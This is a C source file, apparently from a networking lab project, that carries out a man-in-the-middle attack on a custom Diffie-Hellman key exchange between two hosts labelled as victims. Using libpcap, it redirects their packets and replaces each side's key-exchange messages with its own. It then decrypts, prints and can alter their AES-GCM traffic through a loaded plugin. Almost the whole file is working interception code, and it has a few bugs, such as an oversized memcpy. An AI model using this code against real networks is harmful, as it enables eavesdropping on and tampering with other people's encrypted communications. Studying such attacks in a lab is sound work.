//
// Created by bing on 2021/7/18.
//

#include "man_in_middle.h"
#include "dh_protocol.h"   // for man-in-middle attack

// keys buffer
bool has_keys = false;
// save parameters for key generating [ C -> A ]
DH *DH4CLIENT2ATTACKER = NULL;
DH_MSG DH_MSG4CLIENT2ATTACKER = {0};
u_char KEY4CLIENT2ATTACKER[64] = {0};
// save parameters for key generating [ A-> S ]
DH *DH4ATTACKER2SERVER = NULL;
DH_MSG DH_MSG4ATTACKER2SERVER = {0};
u_char KEY4ATTACKER2SERVER[64] = {0};

u_char MAN_IN_MIDDLE_PACKET_COPY[MAX_PACKET_COPY_SIZE] = {0};

u_short checksum(u_short *buffer, u_short size) {
    unsigned long chksum = 0;
    while (size > 1) {
        chksum += *buffer++;
        size -= sizeof(u_short);
    }
    if (size) {
        chksum += *(u_char *) buffer;
    }
    chksum = (chksum >> 16) + (chksum & 0xffff);  //将高16bit与低16bit相加
    chksum += (chksum >> 16);             //将进位到高位的16bit与低16bit 再相加
    return (u_short) (~chksum);
}

u_short tcp_checksum(u_char *tcp_packet, u_short size, uint ip_src, uint ip_dst) {
    // pkt_buff is the ethernet frame, size = pkthdr.len - sizeof(ether_hdr) - sizeof(ip_hdr);
    u_char tcp_checksum_buffer[2048] = {0};
    PSD_TCP_HEADER psd_tcp_header = {ip_src, ip_dst, 0x00, 0x06, htons(size)};
    memcpy(tcp_checksum_buffer, &psd_tcp_header, sizeof(PSD_TCP_HEADER));
    memcpy(tcp_checksum_buffer + sizeof(PSD_TCP_HEADER), tcp_packet, size);
#ifdef DEBUG_FLAG
    puts("checksum: ");
    show_packet(tcp_checksum_buffer, size + sizeof(PSD_TCP_HEADER));
#endif
    return checksum((u_short *) (tcp_checksum_buffer), size + sizeof(PSD_TCP_HEADER));
}

void print_key_and_generate_parameters(u_char *key, DH_MSG *dh_msg, DH *dh) {
    dh_show_message(dh_msg);
    BIO *b;
    b = BIO_new(BIO_s_file());
    BIO_set_fp(b, stdout, BIO_NOCLOSE);
    DHparams_print(b, dh);
    BIO_free(b);
    BIGNUM *temp = NULL;
    temp = BN_bin2bn(key, 32, NULL);
    char *hex_key = NULL;
    hex_key = BN_bn2hex(temp);
    fputs("the key is: ", stdout);
    puts(hex_key);
}


void pkt_hdl4man_in_middle(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pkt_buff) {
    // 定义以太网帧头部, IP头部和 TCP头部数据
    struct ether_hdr eth_hdr = {0};
    struct ip_header ip_hdr = {0};
    struct tcp_header tcp_hdr = {0};
    // 初始化HTTP结构体
    int header_length = sizeof(struct ether_hdr) + sizeof(struct ip_header) + sizeof(struct tcp_header);
    // 获取以太网帧头部,IP头部, TCP头部
    memcpy(&eth_hdr, pkt_buff, sizeof(struct ether_hdr));
    memcpy(&ip_hdr, pkt_buff + sizeof(struct ether_hdr), sizeof(struct ip_header));
    memcpy(&tcp_hdr,
           pkt_buff + sizeof(struct ether_hdr) + sizeof(struct ip_header),
           sizeof(struct tcp_header)
    );
    char src_ip[16];
    char dst_ip[16];
    // read, must be tcp packet
    strcpy(src_ip, inet_ntoa(ip_hdr.ip_src));
    strcpy(dst_ip, inet_ntoa(ip_hdr.ip_dst));
    printf("[%s] info: %s:%d -> %s:%d length: %d  tcp flags: %#03x\n", get_current_date_time(), src_ip,
           ntohs(tcp_hdr.th_sport), dst_ip, ntohs(tcp_hdr.th_dport), pkthdr->len - header_length, tcp_hdr.th_flags);
    // copy to write
    memset(MAN_IN_MIDDLE_PACKET_COPY, 0, MAX_PACKET_COPY_SIZE);
    memcpy(MAN_IN_MIDDLE_PACKET_COPY, pkt_buff, pkthdr->len);
    // got tcp packet....
    u_int tcp_pkt_length = pkthdr->len - sizeof(EtherHdr) - sizeof(IPHeader);
    u_int tcp_hdr_length = (tcp_hdr.th_offset >> 4) * 4;
    u_char *tcp_pkt = MAN_IN_MIDDLE_PACKET_COPY + sizeof(EtherHdr) + sizeof(IPHeader);
    u_char *tcp_data = tcp_pkt + tcp_hdr_length;
    PCAP_HDL_ARGS *a = (PCAP_HDL_ARGS *) args;
    pcap_t *hdl = a->handle;
    PLUGIN_FUNC *plugin_func = a->plugin_func;
    // return value
    int ret; // saving return value...
    // DH_MSG buffer
    DH_MSG temp_dh_msg, temp_dh_msg_rsp;
    DH_MSG *ptr_temp_dh_msg = &temp_dh_msg;
    DH_MSG *ptr_temp_dh_msg_rsp = &temp_dh_msg_rsp;
    bool to_server = false;
    // input output buffer
    u_char in_buff[DH_BUF_SIZE];
    u_char out_buff[DH_BUF_SIZE];

    // TODO ATTENTION 1
    if (tcp_hdr.th_flags == 0x018) {
        if (strncmp((const char *) eth_hdr.dst_mac, (const char *) ATTACKER_MAC, 6) == 0) {
            // change the mac address
            if (strcmp(dst_ip, VICTIM_A) == 0) {
                memcpy(MAN_IN_MIDDLE_PACKET_COPY, VICTIM_A_MAC, 6);
                to_server = true;
            } else {
                memcpy(MAN_IN_MIDDLE_PACKET_COPY, VICTIM_B_MAC, 6);
                to_server = false;
            }
            if (tcp_data[0] == DH_KEY_EXCHANGE_REQ) {
                // if tcp_data[0] == 0x33 try to get keys again
                has_keys = false;
            }
            // judge if we have the keys
            if (has_keys == false) {
                /** we should use server's pubkey and client's user key to handle the packet
                 * we handle packet A1(0x03, g p a) from the client in this way:
                 *  1. parse the packet, got g p A save it
                 *  2. generate a new packet A2 0x03, g', p' A' send to server
                 *  3. wait for the response packet B1, got B save it
                 *  4. generate a new packet B2 0x04, B' send to client
                 *  5. KEY4CLIENT2ATTACKER = ((g  ^ A) ^ B') (mod p)
                 *  6. KEY4ATTACKER2SERVER = ((g' ^ A') ^ B) (mod p')
                 * so that, we got the keys
                 */
                memset(ptr_temp_dh_msg, 0, sizeof(DH_MSG));
                ret = dh_parse_packet(tcp_data, ptr_temp_dh_msg);
                if (!ret) {
                    fprintf(stderr, "parse packet error");
                }
                if (ptr_temp_dh_msg->head.type == DH_KEY_EXCHANGE_REQ) {
                    // 1. parse the packet, got g p A save it
                    fputs("key change request from client.\n", stdout);
                    dh_show_message(ptr_temp_dh_msg);
                    memcpy(&DH_MSG4CLIENT2ATTACKER, ptr_temp_dh_msg, sizeof(DH_MSG));
                    // 2. generate a new packet A2 0x03, g', p' A' send to server
                    DH4ATTACKER2SERVER = DH_new();
                    memset(ptr_temp_dh_msg, 0, sizeof(DH_MSG));
                    ret = dh_key_exchange_request(DH4ATTACKER2SERVER, ptr_temp_dh_msg);
                    if (!ret) {
                        fprintf(stderr, "key change request error");
                    }
                    // set message here
                    dh_cvt_dh_msg2bytes(ptr_temp_dh_msg, tcp_data, tcp_pkt_length - tcp_hdr_length);
                    // got g p A and g' p' A'
                } else if (ptr_temp_dh_msg->head.type == DH_KEY_EXCHANGE_RES) {
                    // 3. wait for the response packet B1, got B save it
                    fputs("key change response from server.\n", stdout);
                    dh_show_message(ptr_temp_dh_msg);
                    memcpy(&DH_MSG4ATTACKER2SERVER, ptr_temp_dh_msg, sizeof(DH_MSG));
                    // 4. generate a new packet B2 0x04, B' send to client
                    DH4CLIENT2ATTACKER = DH_new();
                    memset(ptr_temp_dh_msg_rsp, 0, sizeof(DH_MSG));
                    // generate
                    dh_key_exchange_response(&DH_MSG4CLIENT2ATTACKER, DH4CLIENT2ATTACKER, ptr_temp_dh_msg_rsp);
                    // set message here
                    dh_cvt_dh_msg2bytes(ptr_temp_dh_msg_rsp, tcp_data, tcp_pkt_length - tcp_hdr_length);
                    // generate the keys
                    char pubkey_str[65] = {0};
                    BIGNUM *pub_key = NULL;
                    dh_get_dh_msg_item(&DH_MSG4CLIENT2ATTACKER, 2, (u_char *) pubkey_str, 65);
                    BN_hex2bn(&pub_key, pubkey_str);
                    dh_generate_shared_key(DH4CLIENT2ATTACKER, pub_key, KEY4CLIENT2ATTACKER);
                    memset(pubkey_str, 0, 65);
                    dh_get_dh_msg_item(&DH_MSG4ATTACKER2SERVER, 0, (u_char *) pubkey_str, 65);
                    BN_hex2bn(&pub_key, pubkey_str);
                    dh_generate_shared_key(DH4ATTACKER2SERVER, pub_key, KEY4ATTACKER2SERVER);
                    puts("================================KEY4CLIENT2ATTACKER====================================");
                    print_key_and_generate_parameters(KEY4CLIENT2ATTACKER, &DH_MSG4CLIENT2ATTACKER, DH4CLIENT2ATTACKER);
                    puts("================================KEY4ATTACKER2SERVER====================================");
                    print_key_and_generate_parameters(KEY4ATTACKER2SERVER, &DH_MSG4ATTACKER2SERVER, DH4ATTACKER2SERVER);
                    puts("=======================================================================================");
                    fflush(stderr);
                    fflush(stdout);
                    // set flag has_keys
                    has_keys = true;
                } else {
                    fprintf(stderr, "\nfail, can't got keys...\n");
                }
            } else {
                memset(ptr_temp_dh_msg, 0, sizeof(DH_MSG));
                dh_parse_packet(tcp_data, ptr_temp_dh_msg);
                // communicate between client and server
                memset(out_buff, 0, DH_BUF_SIZE);
                memset(in_buff, 0, DH_BUF_SIZE);
                if (to_server) {
                    dh_aes_256_gcm_decrypt(KEY4CLIENT2ATTACKER, tcp_data + 3, *(tcp_data + 2), out_buff);
                    printf("\033[1;36mreceived from client: %s(%ld), send to server\n\033[0m",
                           out_buff, strlen((char *) out_buff));
                    plugin_func(out_buff, strlen((char *) out_buff));
                    dh_aes_256_gcm_decrypt(KEY4ATTACKER2SERVER, out_buff, strlen((char *) out_buff), tcp_data + 3);
                } else {
                    dh_aes_256_gcm_decrypt(KEY4ATTACKER2SERVER, tcp_data + 3, *(tcp_data + 2), out_buff);
                    printf("\033[1;32mreceived from server: %s(%ld), send to client\n\033[0m",
                           out_buff, strlen((char *) out_buff));
                    plugin_func(out_buff, strlen((char *) out_buff));
                    dh_aes_256_gcm_decrypt(KEY4CLIENT2ATTACKER, out_buff, strlen((char *) out_buff), tcp_data + 3);
                }
            }
            // recalculate the packet
            memcpy(tcp_pkt + 16, "\x00", 2);
            u_short tcp_chksum = tcp_checksum(tcp_pkt, tcp_pkt_length, ip_hdr.ip_src.s_addr,
                                              ip_hdr.ip_dst.s_addr);
            memcpy(tcp_pkt + 16, &tcp_chksum, 2);
            memcpy(MAN_IN_MIDDLE_PACKET_COPY + sizeof(EtherHdr) + sizeof(IPHeader), tcp_pkt, tcp_pkt_length);
            // send to server
            pcap_sendpacket(hdl, MAN_IN_MIDDLE_PACKET_COPY,
                            (int) (sizeof(EtherHdr) + sizeof(IPHeader) + tcp_pkt_length));
        }
    } else {
        // just transfer...
        if (strncmp((const char *) eth_hdr.dst_mac, (const char *) ATTACKER_MAC, 6) == 0) {
            if (strcmp(dst_ip, VICTIM_A) == 0) {
                memcpy(MAN_IN_MIDDLE_PACKET_COPY, VICTIM_A_MAC, 6);
            } else {
                memcpy(MAN_IN_MIDDLE_PACKET_COPY, VICTIM_B_MAC, 6);
            }
            pcap_sendpacket(hdl, MAN_IN_MIDDLE_PACKET_COPY, (int) pkthdr->len);
        } else {
            // do nothing
        }
        printf("\n");
    }
#ifdef DEBUG_FLAG
    puts("\nwill send packet: ");
    show_packet(MAN_IN_MIDDLE_PACKET_COPY, (int) pkthdr->len);
#endif
    fflush(stderr);
    fflush(stdout);
}

int man_in_middle() {
    // variables
    pcap_t *handle;
    char errbuf[PCAP_BUF_SIZE];
    struct bpf_program fp;
    char bpf_filter_str[120] = {0};
    // wrong bpf filter expression...wu wu wu two hours for this....
    sprintf(bpf_filter_str, "((dst %s && src %s) || (src %s && dst %s)) and tcp", VICTIM_A, VICTIM_B, VICTIM_A,
            VICTIM_B);
    printf("bpf filter: %s\n", bpf_filter_str);
    // get and print network interface device and it's net...
    bpf_u_int32 mask, net;
    if (pcap_lookupnet(DEVICE_NAME, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "could not get netmask for device %s: %s\n", DEVICE_NAME, errbuf);
        return -2;
    }
    struct in_addr temp_in_addr;
    char net_str[16];
    char mask_str[16];
    temp_in_addr.s_addr = net;
    strcpy(net_str, inet_ntoa(temp_in_addr));
    temp_in_addr.s_addr = mask;
    strcpy(mask_str, inet_ntoa(temp_in_addr));
    fprintf(stdout, "found device: %s<%s><%s>\n", DEVICE_NAME, net_str, mask_str);
    // non-promise mode
    if ((handle = pcap_open_live(DEVICE_NAME, BUFSIZ, 0, 100, errbuf)) == NULL) {
        fprintf(stderr, "could not open the device: %s: %s\n", DEVICE_NAME, errbuf);
        return -3;
    }
    // compile
    if (pcap_compile(handle, &fp, bpf_filter_str, 0, net) == -1) {
        fprintf(stderr, "could not parse filter %s: %s\n", bpf_filter_str, pcap_geterr(handle));
        pcap_close(handle);
        return -4;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "could not install filter %s: %s\n", bpf_filter_str, pcap_geterr(handle));
        pcap_close(handle);
        return -5;
    }
    // load plugins
    PLUGIN_FUNC *plugin_func = do_nothing;
    char plugin_desc[256];
    void *dl_handle = load_plugin_func("../lib/libman_in_middle_plugin.so", plugin_desc, 256, &plugin_func);
    printf("plugin handle: %p, func address: %p\n", dl_handle, plugin_func);
    printf("plugin desc: %s\n", plugin_desc);
    PCAP_HDL_ARGS pcap_hdl_args = {0};
    pcap_hdl_args.handle = handle;
    pcap_hdl_args.plugin_func = plugin_func;
    fflush(stderr);
    fflush(stdout);
    pcap_loop(handle, -1, pkt_hdl4man_in_middle, (u_char *) &pcap_hdl_args);
    dlclose(dl_handle);
    return 0;
}

void *load_plugin_func(const char *file_name, char *desc, size_t desc_size, PLUGIN_FUNC **func) {
    void *handle;
    char *error;

    handle = dlopen(file_name, RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "%s ", dlerror());
        return NULL;
    }

    PLUGIN_DESC_FUNC *temp_desc = (PLUGIN_DESC_FUNC *) dlsym(handle, "plugin_desc");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "load_plugin_func() load desc error: %s\n", error);
        fflush(stderr);
        return handle;
    }

    PLUGIN_FUNC *temp_func = (PLUGIN_FUNC *) dlsym(handle, "plugin_func");
    error = dlerror();
    if (error != NULL) {
        fprintf(stderr, "load_plugin_func() load desc error: %s\n", error);
        fflush(stderr);
        return handle;
    }
    const char *g_desc = temp_desc();
    size_t size = strlen(g_desc);
    memcpy(desc, g_desc, desc_size > size ? desc_size : size);
    *func = temp_func;
    return handle;
}

void do_nothing(unsigned char *tcp_data, unsigned char size) {
    puts("function do_nothing() called!");
}